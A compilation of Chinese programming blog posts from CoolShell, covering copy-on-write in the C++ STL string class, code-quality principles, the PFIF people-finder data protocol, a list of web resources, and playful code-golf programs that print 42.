OK，让我们一个问题一个问题地探讨吧，慢慢地所有的技术细节都会浮出水面的。#### Copy-On-Write的原理是什么？有一定经验的程序员一定知道，Copy-On- Write一定使用了“引用计数”，是的，必然有一个变量类似于RefCnt。当第一个类构造时，string的构造函数会根据传入的参数从堆上分配内存，当有其它类需要这块内存时，这个计数为自动累加，当有类析构时，这个计数会减一，直到最后一个类析构时，此时的RefCnt为1或是0，此时，程序才会真正的Free这块从堆上分配的内存。是的， **引用计数就是string类中写时才拷贝的原理** ！不过，问题又来了，这个RefCnt该存在在哪里呢？如果存放在string类中，那么每个string的实例都有各自的一套，根本不能共有一个RefCnt，如果是声明成全局变量，或是静态成员，那就是所有的string类共享一个了，这也不行，我们需要的是一个“民主和集中”的一个解决方法。这是如何做到的呢？呵呵，人生就是一个糊涂后去探知，知道后和又糊涂的循环过程。别急别急，在后面我会给你一一道来的。#### string类在什么情况下才共享内存的？这个问题的答案应该是明显的，根据常理和逻辑，如果一个类要用另一个类的数据，那就可以共享被使用类的内存了。这是很合理的，如果你不用我的，那就不用共享，只有你使用我的，才发生共享。
使用别的类的数据时，无非有两种情况，1）以别的类构造自己，2）以别的类赋值。第一种情况时会触发拷贝构造函数，第二种情况会触发赋值操作符。这两种情况我们都可以在类中实现其对应的方法。对于第一种情况，只需要在string类的拷贝构造函数中做点处理，让其引用计数累加；同样，对于第二种情况，只需要重载string类的赋值操作符，同样在其中加上一点处理。唠叨几句：**1）构造和赋值的差别**对于前面那个例程中的这两句：string str1 = "hello world";string str2 = str1;不要以为有“=”就是赋值操作，其实，这两条语句等价于：string str1 ("hello world");   //调用的是构造函数string str2 (str1);            //调用的是拷贝构造函数如果str2是下面的这样情况：string str2;      //调用参数默认为空串的构造函数：string str2(“”);str2 = str1;     //调用str2的赋值操作：str2.operator=(str1);**2) 另一种情况**char tmp[]=”hello world”;
string str1 = tmp;string str2 = tmp;这种情况下会触发内存的共享吗？想当然的，应该要共享。可是根据我们前面所说的共享内存的情况，两个string类的声明和初始语句并不符合我前述的两种情况，所以其并不发生内存共享。而且，C++现有特性也无法让我们做到对这种情况进行类的内存共享。#### string类在什么情况下触发写时才拷贝（Copy-On-Write）?哦，什么时候会发现写时才拷贝？很显然，当然是在共享同一块内存的类发生内容改变时，才会发生Copy-On- Write。比如string类的[]、=、+=、+、操作符赋值，还有一些string类中诸如insert、replace、append等成员函数,包括类的析构时。修改数据才会触发Copy-On-Write，不修改当然就不会改啦。这就是托延战术的真谛，非到要做的时候才去做。#### Copy-On-Write时，发生了什么？我们可能根据那个访问计数来决定是否需要拷贝，参看下面的代码：上面的代码是一个假想的拷贝方法，如果有别的类在引用（检查引用计数来获知）这块内存，那么就需要把更改类进行“拷贝”这个动作。
我们可以把这个拷的运行封装成一个函数，供那些改变内容的成员函数使用。#### Copy-On-Write的具体实现是怎么样的？最后的这个问题，我们主要解决的是那个“民主集中”的难题。请先看下面的代码：string h1 = “hello”;     string h2= h1;     string h3;     h3 = h2;string w1 = “world”;     string w2(“”);     w2=w1;很明显，我们要让h1、h2、h3共享同一块内存，让w1、w2共享同一块内存。因为，在h1、h2、h3中，我们要维护一个引用计数，在w1、w2中我们又要维护一个引用计数。如何使用一个巧妙的方法产生这两个引用计数呢？我们想到了string类的内存是在堆上动态分配的，既然共享内存的各个类指向的是同一个内存区，我们为什么不在这块区上多分配一点空间来存放这个引用计数呢？这样一来，所有共享一块内存区的类都有同样的一个引用计数，而这个变量的地址既然是在共享区上的，那么所有共享这块内存的类都可以访问到，也就知道这块内存的引用者有多少了。请看下图：!o_string于是，有了这样一个机制，每当我们为string分配内存时，我们总是要多分配一个空间用来存放这个引用计数的值，只要发生拷贝构造可是赋值时，这个内存的值就会加一。而在内容修改时，string类为查看这个引用计数是否为0，如果不为零，表示有人在共享这块内存，那么自己需要先做一份拷贝，然后把引用计数减去一，再把数据拷贝过来。下面的几个程序片段说明了这两个动作：
//构造函数（分存内存）     string::string(const char* tmp)     {     _Len = strlen(tmp);     _Ptr = new char[_Len+1+1];     strcpy( _Ptr, tmp );     _Ptr[_Len+1]=0;  // 设置引用计数     }//拷贝构造（共享内存）     string::string(const string& str)     {     if (*this != str){     this->_Ptr = str.c_str();   //共享内存     this->_Len = str.szie();     this->_Ptr[_Len+1] ++;  //引用计数加一     }     }//写时才拷贝Copy-On-Write     char& string::operator     {     if (idx > _Len || _Ptr == 0 ) {     static char nullchar = 0;     return nullchar;     }
_Ptr[_Len+1]--;   //引用计数减一     char* tmp = new char[_Len+1+1];     strncpy( tmp, _Ptr, _Len+1);     _Ptr = tmp;     _Ptr[_Len+1]=0; // 设置新的共享内存的引用计数return _Ptr[idx];     }//析构函数的一些处理     ~string()     {     _Ptr[_Len+1]--;   //引用计数减一// 引用计数为0时，释放内存     if (_Ptr[_Len+1]==0) {     delete[] _Ptr;     }}哈哈，整个技术细节完全浮出水面。不过，这和STL中basic_string的实现细节还有一点点差别，在你打开STL的源码时，你会发现其取引用计数是通过这样的访问：_Ptr[-1]，标准库中，把这个引用计数的内存分配在了前面（我给出来的代码是把引用计数分配以了后面，这很不好），分配在前的好处是当string的长度扩展时，只需要在后面扩展其内存，而不需要移动引用计数的内存存放位置，这又节省了一点时间。
STL中的string的内存结构就像我前面画的那个图一样，_Ptr指着是数据区，而RefCnt则在_Ptr-1 或是_Ptr[-1]处。#### 副作用是谁说的“有太阳的地方就会有黑暗”？或许我们中的许多人都很迷信标准的东西，认为其是久经考验，不可能出错的。呵呵，千万不要有这种迷信，因为任何设计再好，编码再好的代码在某一特定的情况下都会有Bug，STL同样如此，string类的这个共享内存/写时才拷贝技术也不例外，而且这个Bug或许还会让你的整个程序crash掉！不信？！那么让我们来看一个测试案例。假设有一个动态链接库（叫myNet.dll或myNet.so）中有这样一个函数返回的是string类：string GetIPAddress(string hostname)     {     static string ip;     ……     ……     return ip;     }而你的主程序中动态地载入这个动态链接库，并调用其中的这个函数：main()     {     //载入动态链接库中的函数     hDll = LoadLibraray(…..);     pFun =  GetModule(hDll, “GetIPAddress”);
//调用动态链接库中的函数     string ip = (*pFun)(“host1”);     ……     ……     //释放动态链接库     FreeLibrary(hDll);     ……     cout << ip << endl;     }让我们来看看这段代码，程序以动态方式载入动态链接库中的函数，然后以函数指针的方式调用动态链接库中的函数，并把返回值放在一个string类中，然后释放了这个动态链接库。释放后，输入ip的内容。根据函数的定义，我们知道函数是“值返回”的，所以，函数返回时，一定会调用拷贝构造函数，又根据string类的内存共享机制，在主程序中变量ip是和函数内部的那个静态string变量共享内存（这块内存区是在动态链接库的地址空间的）。而我们假设在整个主程序中都没有对ip的值进行修改过。那么在当主程序释放了动态链接库后，那个共享的内存区也随之释放。所以，以后对ip的访问，必然做造成内存地址访问非法，造成程序crash。即使你在以后没有使用到ip这个变量，那么在主程序退出时也会发生内存访问异常，因为程序退出时，ip会析构，在析构时就会发生内存访问异常。
内存访问异常，意味着两件事：1）无论你的程序再漂亮，都会因为这个错误变得暗淡无光，你的声誉也会因为这个错误受到损失。2）未来的一段时间，你会被这个系统级错误所煎熬（在C++世界中，找到并排除这种内存错误并不是一件容易的事情）。这是C/C++程序员永远的心头之痛，千里之堤，溃于蚁穴。而如果你不清楚string类的这种特征，在成千上万行代码中找这样一个内存异常，简直就是一场噩梦。备注：要改正上述的Bug，有很多种方法，这里提供一种仅供参考：`string ip = (*pFun)(“host1”).cstr();`#### 后记文章到这里也应该结束了，这篇文章的主要有以下几个目的：1）向大家介绍一下写时才拷贝/内存共享这种技术。   2）以STL中的string类为例，向大家介绍了一种设计模式。   3）在C++世界中，无论你的设计怎么精巧，代码怎么稳固，都难以照顾到所有的情况。智能指针更是一个典型的例子，无论你怎么设计，都会有非常严重的BUG。   4）C++是一把双刃剑，只有了解了原理，你才能更好的使用C++。否则，必将引火烧身。如果你在设计和使用类库时有一种“玩C++就像玩火，必须千万小心”的感觉，那么你就入门了，等你能把这股“火”控制的得心应手时，那才是学成了。
**更新：在最新的STL中，这个特性已经被去掉了。有一个原因是线程不安全！COW其实还是比较危险的。**（全文完）# 优质代码的十诫作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn## 1.- DRY: Don’t repeat yourself.!10commandementsDRY 是一个最简单的法则，也是最容易被理解的。但它也可能是最难被应用的（因为要做到这样，我们需要在泛型设计上做相当的努力，这并不是一件容易的事）。它意味着，当我们在两个或多个地方的时候发现一些相似的代码的时候，我们需要把他们的共性抽象出来形一个唯一的新方法，并且改变现有的地方的代码让他们以一些合适的参数调用这个新的方法。DRY 这一法则可能是编程届中最通用的法则了，目前为止，应该没有哪个程序员对这一法则存有异议。但是，我们却能发现，一些程序在编写单元测试（unit testing）时忘记了这一法则：让我们相像一下，当你改变一个类的若干接口，如果你没有使用DRY，那么，那些通过调用一系例类的接口的unit test的程序，都需要被手动的更改。比如：如果你的unit test的诸多test cases中没有使用一个标准共有的构造类的方法，而是每个test case自己去构造类的实例，那么，当类的构造函数被改变时，你需要修改多少个test cases啊。这就是不使用DRY法则所带来的恶果。
## 2.- 短小的方法.至少，我们有下面三个不错的理由要求程序员们写下短小的方法。1. 代码会变得更容易阅读。   2. 代码会变得更容易重用（短方法可以减少代码间的耦合程度）   3. 代码会变得更容易测试。## 3.- 良好的命名规范使用不错的统一的命名规范可以让你的程序变得更容易阅读和维护，当一个类，一个函数，一个变量的名字达到了那种可以“望文生义”的境界话，我们就可以少一些文档，少一些沟通。文章《编程中的命名设计那点事 》可以给你一些提示。## 4.- 赋予每个类正确的职责一个类，一个职责，这类规则可以参考一下类的 **S** OLID 法则。但我们这里强调的不是一种单一的职责，而是一个正确的职责。如果你有一个类叫Customer，我们就不应该让这个类有sales 的方法，我们只能让这个类有和Customer有最直接关系的方法。## 5.- 把代码组织起来把代码组织起来有两具层次。* **物理层组织** ：无论你使用什么样的目录，包(package)或名字空间(namespace)等的结构，你需要把你的类用一种标准的方法组织起来，这样可以方便查找。这是一种物理性质的代码组织。   * **逻辑层组织** ： 所谓逻辑层，主要是说，我们如果把两个不同功能的类或方法通过某种规范联系和组织起来。这里主要关注的是程序模块间的接口。这就是我们经常见到的程序模块的架构。
## 6.- 创建大量的单元测试单元测试是最接近BUG的地方，也是修改BUG成本最低的地方，同样也是决定整个软件质量好坏的成败的地方。所以，只要有可能，你就应该写更多的，更好的单元测试案例，这样当你未来有相应代码改变的时候，你可以很简单知道你代码的改变是否影响了其它单元。## 7.- 经常重构你的代码软件开发是一种持续的发现的过程，从而让你的代码可以跟上最新的实际需求的变化。所以，我们要经常重构自己的代码来跟上这样的变化。当然，重构是有风险的，并不是所有的重构都是成功的，也不是我们随时都可以重构代码。下面是两个重构代码的先要条件，以避免让你引入更多的BUG，或是把本来就烂的代码变得更烂。1. 有大量的单元测试来测试。正如前面所说，重构需要用大量的单元测试来做保障和测试。   2. 每次重构都不要大，用点点滴滴的小的重构来代替那种大型的重构。有太多的时候，当我们一开始计划重构2000行代码，而在3个小时后，我们就放弃这个计划并把代码恢复到原始的版本。所以，我们推荐的是，重构最好是从点点滴滴积累起来的。## 8.- 程序注释是邪恶的这一条一定是充满争议的，大多数程序员都认为程序注释是非常好的，是的，没错，程序注释在理论上是非常不错的。但是，在实际过程序当中，程序员们写出来的注释却是很糟糕的（程序员的表达能力很有问题），从而导致了程序注释成为了一切邪恶的化身，也导致了我们在阅读程序的时，大多数时候，我们都不读注释而直接读代码。所以，在这里，我们并不是鼓励不写注释，而是——如果你的注释写得不够好的话，那么，你还不如把更重要的时间花在重构一下你的代码，让你的代码更加易读，更加清楚，这比会比注释更好。
## 9.- 注重接口，而不是实现这是一个最经典的规则了。接口注重的是——“What”是抽象，实现注重的是——“How”是细节。接口相当于一种合同契约，而实际的细节相当于对这种合同契约的一种运作和实现。运作是可以很灵活的，而合同契约则需要是相对需要稳定和不变的。如果，一个接口没有设计好而需要经常性的变化的话，那我们可以试想一下，这代来的后果，这绝对会是一件成本很大的事情。所以，在软件开发和调设中，接口是重中之重，而不是实现。然而我们的程序员总是注重于实现细节，所以他们局部的代码写的非常不错，但软件整体却设计得相对较差。这点需要我们多多注意。## 10.- 代码审查机制所有人都会出错，一个人出错的概率是很大的，两个人出错的概率就会小一些，人多一些，出错的概率就会越来越小。因为，人多了，就能够从不同的角度看待一个事情，虽然这样可能导致无效率的争论，但比起软件产品release后出现问题的维护成本，这点成本算是相当值得的。所以，这就是我们需要让不同的人来reivew代码，代码审查机制不但是一种发现问题的最有效的机制，同时也是一种可以知识共享的机制。当然，对于Code Review来说，下面有几个基本原则：
* 审查者的能力一定要大于或等于代码作者的能力，不然，代码审查就成了一种对新手的training。   * 而且，为了让审查者真正负责起来，而不是在敷衍审查工作，我们需要让审查者对审查过的代码负主要责任，而不是代码的作者。    * 另外，好的代码审查应该不是当代码完成的时候，而是在代码编写的过程中，不断地迭代代码审查。好的实践的，无论代码是否完成，代码审核需要几天一次地不断地进行。（ **我以我个人的语言叙述本文，并加入了我个人的经历，所以，请你在转载时请注意作者和出处，并且，请勿用于商业用途** ）文章：来源# PFIF网上寻人协议作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本文的主要内容来自Wikipedia(http://en.wikipedia.org/wiki/People_Finder_Interchange_Format)PFIF全称People Finder Interchange Format，是一个应用广泛的数据开源的标准协议，这个协议主要是设计用来在不同的政府、救援组织、或是其它的一些灾难中生存者和其亲人联系的网站间进行数据交换的一种协议。
这个协议基于XML，信息中包括人的身份标识，还有人目前的位置和状态等一些信息。PFIF可以通过Atom和RSS feed出去。PFIF可以允许不同的寻人站点进行数据交换和合并。每一条记录都有一个唯一的标识，这个标识说明了这是由哪个域名创建的。这样，当A站点获得B点的某个人的数据时，在A站点可以对这个人的增加的信息可以转到其它站点上再被增加相关的信息，因为有一个唯一的ID，所以信息可以在不同的站点上被附加。从wikipedia上看，说起PFIF这个事，得回到2001年的911事件，那时人们一共使用了超过25个不同的在线论坛和网上寻人站来查找相关的亲人和朋友（注：寻人网站英文叫：Survivor Registry，生还者登记网站）。其中一个最大的网站是由伯克利大学的学生Ka-Ping Yee 和 Miriam Walker 开发运行在Millennium计算集群上的safe.millennium.berkeley.edu网站。那时，为了减少各种网站间的混乱，伯克利的寻人网站开始从其它几个比较大的寻人站点收集相关的数据，并人肉整合到一起。2005年，在卡特里娜飓风 灾难的时候，有数据百万人迁移。于是相关的寻人网站又出现了，而且比911的还要多。于是有很多的志愿者开发了一个叫 Katrina PeopleFinder Project（卡特里娜寻人项目） 他们人肉地收集不同站点的数据，并统一格式放到一个由Salesfore.com提供一个数据库中。这个项目的组织者David Geilhufe 呼吁一个技术标准以便这些寻人网站间的数据可以自动地整合共享在一起。于是之前伯克利的那个 Ka-Ping Yee 开始和志愿者 Kieran Lal，Jonathan Plax 和 CiviCRM 团队一同工作，于是开始了草拟了第一版的PFIF协议，其于2005年9月4日发布，1.1版于第二天发布，其中修改了一些错误。随后，Salesfore.com的数据库开始支持这一标准，然后，Yahoo!和Google的寻人网站也加入这一协议。
接下来， 2010年的海地地震 时，Google发布了自己的 Google Person Finder，其基于PFIF协议和CNN，纽约时报，以及美国国家医学图书馆和其它的一些寻人网站进行数据交换。然而，PFIF1.1是基于美国的社会标准搞的，并不适用于海地。于是2010年1月26日，PFIF1.2发布，其增加了几个字段用于标记生还者的国家和国际区号，还有性别，年纪，生日，状态，还有相同人的关联。PFIF 1.3 于2011年3月发布，其主要解决了个人隐私问题，其加入了一个字段指明该信息的一个有效时间，过期的数据会被删除。PFIF1.3同时移除了英式的first- name和last-name，取而代之的是full-name。PFIF 1.4 于2012年5月发布，其加入了一个字段用于链接这个人在互联网上的个人资源链接，这样可以用于合并相同的人（比如：指向同一个微博网址），还支持了多个照片。**PFIF1.4的Spec链接：http://zesty.ca/pfif/1.4/ **如下的网站有软件实现了PFIF：* Google Person Finder   * Sahana Eden   * National Library of Medicine People Locator   * Ushahidi   * PFIF .NET Library   * XML::PFIF Perl module
本次四川地震，谷歌率先发布了他人寻人网站：。接下来，国内的百度，360，搜索，一淘，CSDN，高德……都发布了自己的寻人网站，微博上，大家都在说这些企业不应该搞这么多这样的网站，这样只会造成混乱。而且大家都在呼吁大家一起运作一个网站，共享数据，共享信息。晚上，我在微博上看到了这个PFIF协议，于是写下这篇文章。关于Google 的寻人的数据可以通过Google PersonFinder API 下载和上传，这里是其API页面：**http://code.google.com/p/googlepersonfinder/wiki/DataAPI**# 一些非常有意思的杂项资源作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一些最近在互联网上看到的一些各式各样的资源和文章，当然，都是英文社区的，本来想每一个写一篇文章，但是觉得一篇文章一句话真没劲，所以，把这些东西合并写成一篇文章，这样有利于减轻本站的负载，也有利于节省网络带宽，同样，也就节省了能力和电力，因此也就很环保，很低碳。呵呵。* 先是一个《Windows Internal》第五版的第五章的电子版（英文的），你可以在 **这里下载**。关于其它一些电子书，你可以看看本站的这篇文章《免费电子书列表》、《非常不错的编程技术教程》、《超过100本的linux免费书籍》和《20本最好的Linux免费书籍》
→* **http://www.3dtin.com/**是一个用纯Javascript搞的一个3D作图的网站，Javascript是越来越强大了。这个演示可以让你看到以后Web应用的潜力。关于Javascript的一些东西，你可以参看本站的这些文章《JS1K 演示》、《又一个Javascript试验田》、《一个Windows 3.1的Web网站》、《哥是玩程序的》。→* 说到这些很酷很炫的东西，大家一定会想到使用Flash，不过，目前的Flash正在受到HTML5的强力挑战，目前，对于HTML5的展示网站很多，让我们看到了HTML5完全可以做出Flash的样子，比如前些天本站说到的这个演示，还有给大家展示的纯HTML5的小游戏，不过，那些都是一些演示和展示罢了。今天在网上看到一个更强大的HTML5游戏，相当有可玩性，大家不妨一去试玩： ****→* HTML5 可以应用的还不只是游戏，这不，有文章指出，用 **VexFlow**还可以很轻松地在网页上发布乐谱。而 **这个网页**还可以让你制作Hi-PoP音乐。!Rendered music→* 说到Web开发，就得要提CSS了，这里有一个在线编辑CSS的网站，很不错， **http://css3.mikeplate.com/**。关于CSS和Web开发的一些文章，你可以查看本站的CSS的Tag。现在，这种在线的东西是越来越多了，比如：《Emacs配色在线生成器》、《Coderun.com 在线开发IDE》、《正则表达式生成器》、《Ajax开发利器UIzard》、《一个在线的画UML图的网站》。
→* 说起在线服务，就不得不说说在线代码编译的服务，我觉得这种服务相当好，不需要你在本机安装编译器或IDE，想试试某个语言的语法，真接上网就OK，很方便。以前本站向大家介绍过《在线代码编译服务Codepad.org》其支持：C，C++，D，Haskell，Lua，OCaml，PHP，Perl，Plain Text，Python，Ruby，Scheme，Tcl。当然，在这里，向你介绍一个可以运行Go语言的： **http://golang.org/doc/play/**→* 说起Web开发，很自然的就能想到UI。下面是一个 **UI的设计Patterns**，这篇文章告诉了我们12个比较常用或是经典的图形UI Patterns。关于UI方面的话题，你可以参看酷壳的《35个强大的UI设计教程》、《UI的恶梦》和《史上最糟糕的网站》。→* 说起Web的界面，最让各位WEB开发者痛苦的就是网页兼容性问题，IE是一个恶梦，因为其自己和自己都不兼容，在MSDN上，有这样的一个网页说明了 **从IE5一直到IE9的CSS的兼容性问题**，很多很多的表格，头都看大了。当然，以前本站的《检查网页浏览器的兼容性》的文章向你介绍过如何查看网站在不同浏览器中和操作系统下的效果（其也是一个在线服务）。
→* 当然，Web上的开发，问题最大的还是安全问题，我们的Ruby on Rails给出了一个 **Web安全的开发教程**，相当不错哦。谈到了几乎所有最有威胁和最常用的网上攻击，这个文档应该是所有Web开发者都需要注意的。→* 下面是一个给新手学习linux用的一个桌面（点击图片看大图），其列出了很多常用的命令，以及VI的常用命令。关于VI的一些东西，你可以查看本站的这些文章，如：VIM有趣的命令、如何在vim中得到你最喜爱的IDE特性→* 最后，给大家介绍一个关于文件格式方面东西，我们知道，很多文件的开头表明着这个文件的类型，所以，有这样的一个网站了维护了这么一个信息列表，其把几乎所有常见的文件头的那段和文件类型相关的Magic Number列了出来，而且还保持更新，非常不错哦，这个网站是： ** ，希望能对你有用哦。**→* **最最后，给大家介绍一个开源项目，叫 **Structure Synth**，这个东西可以用来画出一些很酷的图，相当不错，使用起来非常简单，我试用了一下，的确很强大。用一些简单的脚本就可以作出很不错的3D图，下面是他的一个示例，只需要写那么不到10行的代码，很简单。**
想看看，大家用这个东西做什么酷图了吗？上  看看吧。!structure 作者 Supreet Kumar !architecture x-ray 2 作者 Supreet Kumar !perspective 作者 Supreet Kumar !snake shade 作者 Supreet Kumar !thatched beauty 作者 Supreet Kumar   !aircraft 作者 Supreet Kumar !aircraft 作者 Supreet Kumar ! 作者 FracturedPixel !splash1 作者 Supreet Kumar !joy 作者 Supreet Kumar（全文完）# 如何用最有创造力的方式输出42作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn酷壳似乎好长时间没有像《编程真难啊》或是《老手是这样教新手编程的》或是像《如何写出无法维护的代码》这样“严肃正经”的文章了，所以，赶在大家还没有向我扔臭鸡蛋前奉献一篇。这篇文章来自CodeGolf.StackExchange上的《Most creative way to display 42》—— 请以最有创造力的方式输出42。于是出现了下面的这些答案（注：精彩的总是留在最后面）
目录* 人生和宇宙终级问题的答案：42   * Ruby   * Javascript   * Shell   * Python   * Java   * C/C++   * Brainfuck#### 人生和宇宙终级问题的答案：42这里，需要介绍一下为什么要输出42。这时因为42是我们人生，世界乃至整个宇宙的终级答案。这要从《银河系漫游指南》（英文名：The Hitchhiker’s Guide to the Galaxy）说起。这本书是著名英国科幻小说作家Douglas Adams所著5本银河系漫游指南系列科幻喜剧系列小说中的第一本，改编自他本人为英国广播公司第四电台（BBC Radio 4）所写的广播剧剧本。该书1979年10月12日首次由麦克米伦出版公司（Pan Books）出版，次周成为英国图书销量榜冠军，前3个月内销售超过25万本。截至2005年，这本小说已被翻译成超过30种语言在全世界发行，并且被改编为电视剧、电影、舞台剧等多种艺术形式的作品。这本小说中小说中充满尖锐的讽刺和隐喻，被西方科幻爱好者奉为“科幻圣经”。其中有两个关键词，一个是Don’t Panic，一个是42影响力很大，而其中关于42的故事简介是这样的：
百万年前，老鼠其实是一种超智慧生物，它们建造了一部超级电脑深思Deep Thought，它们问超级电脑，生命、宇宙以及任何事情的终极答案（ _Answer to Life, the Universe, and Everything_ ）什么，经过了750万年的计算，深思告诉老鼠的后人答案是 **42** ，深思解释它只能计算出答案是什么，但答案的原因必须由另一部更高智能的电脑才能解释，而该部电脑就是地球。经过了800万年，就在结果要出来的五分钟前，地球却因为挡在预定兴建的星际间高速公路的路线，被Vogons给毁灭，电脑没有给出最后的结果。故事里面还说了这个42是6 乘于 9得来。当然，6乘9应该是54，但是因为地球上的电脑被搞坏了，导致主人翁答错了。至于后来有人说6 x 9 = 42是基于13进制，原作者说，完全没有这回事，他就是瞎搞的。网上有很多人在猜测42的含义，比如douban的这篇文章，但是原作者出来说这他就是随机想了一个，完全没有任何意义。对于42来说，数字42和短语，“生命，宇宙以及一切的答案”（ _Answer to Life, the Universe, and Everything_ ） 已达到在互联网上邪教的地位。在各种技术宅，极客，科学圈有着非同凡响的地位。
* 您若在Google输入the answer to life, the universe, and everything，Google会直接回答42——而且还是用Google计算器算出来的。   * 若在Wolfram Alpha中输入Answer to the Ultimate Question of Life, the Universe, and Everything，Wolfram Alpha也会回答42   * 若在iPhone/iPad的Siri中问[What’s the meaning of life?]，Siri也会回答42   * 在OpenOffice.org软件，如果您在任何单元格输入spreadsheet=ANTWORT(“Das Leben, das Universum und der ganze Rest”) (注：德语的ANSWER(“life, the universe and everything”))，结果也会是42。另外，在美剧《Lost》里那个经典的数字序列： 4, 8, 15, 16, 23,42。经Lost的导演确认，最后那个42也是源自《银河系漫游指南》
好了，言归正传，下面让我们来看一下如何输出42的。#### Ruby``puts (6 * 9).to_s(13)[/h4]解释：6 x 9 = 42的表达式（基于13进制）#### Javascript[javascript]String.prototype.answer = function() {   alert(this.charCodeAt(+!"The End of the Universe"));   };   ‘*’.answer();[/javascript]解释：+!”The End of the Universe”的值是0，’*’的ASCII码是42/* [1,1,0,3,1,9,5,2] => March 11, 1952 */[/javascript]解释：Douglas Adams 是一位英国广播剧作家、和音乐家，尤其以《银河系漫游指南》系列作品出名。这部作品以广播剧起家，后来发展成包括五本书的“三部曲”，拍成电视连续剧。亚当斯逝世后还拍成电影。 除《银河系漫游指南》系列外亚当斯还参加了科幻电视连续剧《神秘博士》的拍摄工作，他写了其中的一些剧本。也的生日是 1952 年 3 月 11 日。
[javascript]alert((!![]+ -~[])*(!![]+ -~[])+""+(!![]+ -~[]))[/javascript]解释：[]是个空，![]就是true，~[]是-1, 于是，表达式就这样出来了。变态！[javascript]var ________ = 0.023809523809523808, ____ = 1, ___ = 0, __ = 0, _ = 1;__ – ___   /_ |0 // \\\   /_/ 0 // \\\   /_/_ |0 //   /_/_ |0 //   /_/____ |_ //   /________|0 //   |0 //______________[/javascript]解释：这个其实是代码混乱的技巧之一，用下划线当变量。你可以参考《如何加密/混乱C源代码》和《6个变态的C语言Hello World程序》#### Shell`echo "what is the universe"|tr "a-z " 0-7-0-729|sed 's/9.//g;s/-/+/'|bc`解释：其中，bc是一个计算器。tr是一个字符转换的命令，比如：`echo "good" | tr "good" "test"`输出 `tsst`。也就是说，g-t, o-e, o-s, d-t的映射，o被映了两次，所以，第二次会覆盖第一次。对于上面的`tr "a-z " 0-7-0-7-729`的意思是：abcdefg分别对应01234567，h对应-，ijklmno对应01234567，p对于2，剩下的包括空格都是9。如果你对tr和sed和bc不熟悉的话，可以man一下，关于sed你可以看一下我的《sed简明教程》
#!/bin/bash#Vertical Version     echo $((2#100))     echo $((2#10))#Horizontal Version     echo $((2#000100))$((2#00010))解释：2#100的意思就是说，#左边的数说明是“2进制”，右边的数是二进制数“100”，如16#ff就是16进制的ff，也就是十进制的255`echo "obase=13;6*9"|bc|figlet`上面的命令输出：_  _  ____     | || ||___ \     | || |_ __) |     |__   _/ __/     |_||_____|解释：为了使用figlet命令，你还要去安装一个figlet（）这是一个让你画ASCII图的命令。#### PythonWindows下，给你画个图：import win32api, win32con, win32gui     from time import time, sleep     import osdef d( x1, y1, x2, y2 ):     win32api.SetCursorPos((x1, y1))     win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)     win32api.SetCursorPos((x2, y2))     win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)     sleep(0.01)
def p( l1 ):     l2 = [""]     l2.extend(l1)     l1.append("")     l3 = zip(l2, l1)     l3.pop(0)     l3.pop(-1)     for n in l3:     d(n[0][0], n[0][1], n[1][0], n[1][2])os.startfile("C:\Windows\system32\mspaint.exe")     sleep(0.5)     win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_MAXIMIZE)     sleep(0.5)for n in w:     p(w[n])输出：lambda表达式`>>> p = lambda x: x%2!=0 and True<>> sum(p(i) for i in range(0,6))`解释：对python的lambda表达式或函数式编程不是很清楚的同学可以看一下《函数式编程》#### Javaint arthur_dent = s.length();     int ford_prefect = s2.length();     int zooey_deschanel = s3.length();     int vogon_poetry = arthur_dent + ford_prefect;
System.out.println("         " + vogon_poetry + "       " + zooey_deschanel + " " + zooey_deschanel); //in case you're confused, I'm using Zooey to print the big '2', and Vogons to print the big '4'.     System.out.println("       " + vogon_poetry + vogon_poetry + "     " + zooey_deschanel + "     " + zooey_deschanel);     System.out.println("     " + vogon_poetry + "  " + vogon_poetry + "    " + zooey_deschanel + "       " + zooey_deschanel);     System.out.println("   " + vogon_poetry + "    " + vogon_poetry + "            " + zooey_deschanel);     System.out.println(" " + vogon_poetry + "      " + vogon_poetry + "          " + zooey_deschanel);     System.out.println(vogon_poetry + " " + vogon_poetry + " " + vogon_poetry + " DA " + vogon_poetry + "     " + zooey_deschanel);     System.out.println("         " + vogon_poetry + "     " + zooey_deschanel);     System.out.println("         " + vogon_poetry + "    " + zooey_deschanel + " " + zooey_deschanel + " " + zooey_deschanel + " " + zooey_deschanel);     }     }
上面这段看上去平淡无奇，但其亮点是那三个string，这段代码输出：42       42 42     4242     42     42     42  42    42       42     42    42            42     42      42          42     42 42 42 DA 42     42     42     42     42    42 42 42 42别忘了Java也可以混乱代码：#### C/C++解释：\b是backspace，fprintf的返回值是写成功数据的长度。输出：#define six  1+5     #define nine 8+1解释：6 x 9 = 42 ???，如果你知道宏只是做简单的字符串替换的话，你就知道six*nine被替换成了1+5*8+1这个表达式了。呵呵。解释：参看原文的这个答案里的How-To一节。#### Brainfuck代码混乱自然少不了brainfuck语言：（更多的奇葩的编程语言请参考《那些BT雷人的编程语言》）+++++          +++[>+>++>     +++>++        ++>+++++>+++++     +>+++++       ++>+        ++++     +++ >+++       ++++        ++>+     +++  ++++                   ++>+     +++   ++++                  +++>     +++    ++++                 ++++     +>+     ++++               ++++     +++      +>++             ++++     ++++++++>+++++++++       ++++     ++>+++++++++++++++     +<<<     <<<<        <<<<     <<<<       <-]>     >>>>       >>----.++++<<<<<     <<>>       >>>>++.--<<<<<<.
不过，下面这个BrainFuck更无聊，所以顶在了最佳答案上：+++++[>++[>+>+        ++>++++>++++>++++>++++++     >++++++>+++++++        ++>+++++++++<<<<<<<<<-]>>     >+>+>+> >>>+[<]<        -]>>       >++>-->>+>>++>+     >--<<<<  <<<.....         .>            ....<......     ...>...   <<.>....                       >.>>>>>.<.     <<<<..     ..<....                      >..>>>>>.<     .<<<<.      >>>.<<.                     >>>>>.<.<     <<<<<       <.>...>                    >>>.>>>.     <<<.<        <<<..>>                  .>>>>>.<     <.<<<         <<...>>                 >>>.<<<     <..<.          ...>...               <<.>..>.     >>.<.<<...>>...<<...>>...<         <....>>..     .<<<.>.>>..>.<<.......<....        .....>...     <<.>...            .....>...     <......           .>>>.<<..     <<.>...          .....>...<......>.>>.<.<<<     .>......        